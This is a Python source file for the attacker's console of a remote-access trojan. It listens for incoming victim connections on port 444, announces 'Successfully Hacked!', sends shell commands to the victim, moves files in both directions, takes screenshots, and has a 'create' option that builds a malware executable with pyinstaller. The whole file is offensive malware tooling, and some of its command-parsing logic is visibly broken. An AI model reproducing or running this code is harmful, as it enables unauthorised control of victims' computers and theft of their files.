import base64
from colorama import Fore
import socket
import base64
from lib.extra import Extra
import os
import pyautogui
from lib.create import Create

os.system('clear')
Extra().main()
help_user='''
1)set (lhost/rhost) <ip>
2)help
3)run
4)create
'''

class Listener:
    def __init__(self,ip):
        listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,444))
        listener.listen(0)
        print(Fore.YELLOW,'[*] Waiting for incomming connections')
        self.connection,addr=listener.accept()
        print(Fore.BLUE,'[+] Successfully Hacked! ',str(addr))
    def execute(self,command):
        self.connection.send(command)
        return self.connection.recv(1024)
    def write_file(self,path,content):
        with open(path,'w') as file:
            file.write(base64.b64decode(content))
            return "[+] Downloaded File successfully!"
    def read_file(self,path):
        with open(path,'rb') as file:
            return base64.b64encode(file.read())
    def run(self):
        while True:
            command=input("(terminal)>>")
            command.split(' ')
            try:
                if command=='exit':
                    self.connection.close()
                    exit()
                elif command[0]=='upload':
                    result=self.read_file(command[1])
                elif command[0]=='download' and 'Error' not in result:
                    result = self.write_file(command[1],result)
                elif command=='screenshot':
                    result=self.write_file('image.jpg',result)
                else:
                    self.execute(command)
                result=self.execute(command)
                print(Fore.GREEN,result)
            except Exception:
                result='Error!'

if __name__=='__main__':
    count=0
    ip_host=''
    ip_target=''
    while True:
        user_input=input(">>>")
        if user_input.split(" ")[0]=='set':
            try:
                if user_input.split(" ")[1]=='lhost':
                    ip_host=user_input.split(" ")[2]
                elif user_input.split(" ")[1]=='rhost':
                    ip_target=user_input.split(' ')[2]
                else:
                    print(Fore.RED,'[!] Invalid option ',user_input.split(" ")[1])
            except IndexError:
                print(Fore.RED,'[!] Usage: set (lhost/lport) <ip>')
        elif user_input=='create':
            if count==0:
                Create(ip_host).create()
                count +=1
                type_os=input("Enter the type of os [w/l/m]: ")
                print(Fore.RED,'[+] Creating malware')
                if type_os.lower()=='w':
                    os.system('pyinstaller malware.py --onefile')
                else:
                    pass
        elif user_input=='help':
            print(Fore.YELLOW,help_user)
        elif user_input=='run':
            if ip_host=='' or ip_target=='':
                print(Fore.RED,'[!] Set up the host and the ip')
            else:
                Listener(ip_target).run()
        elif user_input=='exit':
            exit()
        else:
            print(Fore.RED,'[!] Command not found')